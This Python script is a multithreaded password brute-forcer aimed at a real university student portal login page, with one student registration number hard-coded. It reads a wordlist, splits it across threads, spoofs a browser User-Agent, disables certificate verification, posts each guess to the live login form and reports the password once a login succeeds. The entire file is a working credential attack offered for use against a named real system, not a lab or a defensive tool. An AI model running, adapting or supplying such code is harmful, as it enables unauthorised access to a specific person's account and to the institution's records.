import colorama
import requests
import os
import threading
import ProgressBar
import RequestsConfig
import time
from utilities import *

output_strings = list()
threads = list()
threadLock = threading.Lock()
finished_status = list()
passwords = list()
start_end_ranges = list()
correct_password = ""

PROGRESS_INTERVAL = 10


class smisThread(threading.Thread):

    def __init__(self, threadID, threadName, start_end_range):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.threadName = threadName
        self.start_index = start_end_range[0]
        self.end_index = start_end_range[1]
        self.total_count = self.end_index - self.start_index
        self.ProgressBar = ProgressBar.ProgressBar(self.total_count)

    def run(self):
        global correct_password
        print_progess = self.start_index + PROGRESS_INTERVAL
        with requests.Session() as session:
            try:
                for index in range(self.start_index, self.end_index):
                    session.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'
                    data = {
                        'regNo': 'f16/1682/2019',
                        'smisPass': passwords[index],
                        'smisLogon': 'Login'
                    }
                    response = session.post(
                        'https://smis.uonbi.ac.ke/index.php', data=data, verify=False)

                    # If the login was successful, we acquire the lock, set the password to the password we just tried, release the lock and set the finished status to True
                    if checkSuccessfulLogin(data["regNo"], response):
                        correct_password = passwords[index]
                        finished_status[self.threadID] = True
                        break

                    # If the login was unsuccessful, we increment the progress bar and store the output in the output_strings list
                    if index == (print_progess - 1):
                        if threadLock.acquire(blocking=False):
                            output_strings[self.threadID] = self.ProgressBar.getProgessBarString(
                                (index - self.start_index) + 1)
                            threadLock.release()
                        print_progess += PROGRESS_INTERVAL

                    # If the password has been found, we break out of the loop
                    if correct_password != "":
                        finished_status[self.threadID] = True
                        return

                # In this case, we've reached the end of the range and the password has not been found, so we set the finished status to True and set the output string to the last progress bar string
                threadLock.acquire()
                output_strings[self.threadID] = self.ProgressBar.getProgessBarString(
                    self.total_count)
                finished_status[self.threadID] = True
                threadLock.release()
                return
            except Exception as e:
                output_strings[self.threadID] = colorama.Fore.RED + "\r" + self.threadName + " Crashed."
                finished_status[self.threadID] = True
                return

    def getName(self) -> str:
        return self.threadName


# Configure Requests to be less secure, so that it can connect to the SMIS website
RequestsConfig.configure_requests()

# Read all passwords from the passwords file and store them in a list
print("Reading passwords from file...")
with open('./passwords') as handle:
    while True:
        line = handle.readline()
        if not line:
            break
        line = line.rstrip()
        passwords.append(line)
print("Read " + str(len(passwords)) + " passwords.")


# Query the number of threads to be created from the user
num_threads = int(input("Enter the number of threads to be created: "))

# Divide all the passwords into equal parts and store them in a list of tuples, with any leftover passwords being added to the last tuple
passwords_per_thread = int(len(passwords) / num_threads)
for i in range(num_threads):
    if i == (num_threads - 1):
        start_end_ranges.append((i * passwords_per_thread, len(passwords)))
    else:
        start_end_ranges.append(
            (i * passwords_per_thread, (i + 1) * passwords_per_thread))


# populate the output_strings list with empty strings
for i in range(0, num_threads):
    output_strings.append("")

# Populate the finished_status list with False
for i in range(0, num_threads):
    finished_status.append(False)

# Create the threads and store them in the threads list
for i in range(0, num_threads):
    threads.append(smisThread(i, "Thread-" + str(i), start_end_ranges[i]))
    print(threads[i].getName() + " created")

# Start the threads
for thread in threads:
    thread.start()
    print(thread.getName() + " started")

print("All threads started")
print("Starting to check passwords...")
time.sleep(3)

# print the output strings
while True:
    # If the correct password has been found, we break out of the loop
    #if correct_password != "":
    #    break
    if threadLock.acquire(blocking=True):
        os.system("clear")
        print(colorama.Fore.WHITE+"Generating passwords using " +
              str(num_threads) + " threads...", end="\n")
        # Enumerate the output strings and print them
        for index, output_string in enumerate(output_strings):
            print(colorama.Fore.WHITE + "Thread-" + str(index) + ": ", end='\n')
            print(output_string, end='\n')
        threadLock.release()
    if all(finished_status):
        break
    else:
        time.sleep(0.5)

# Join the threads
for thread in threads:
    thread.join()

print(colorama.Fore.WHITE+"All threads completed.")
if correct_password != "":
    print("Password found: " + correct_password)
else:
    print("Password not found.")
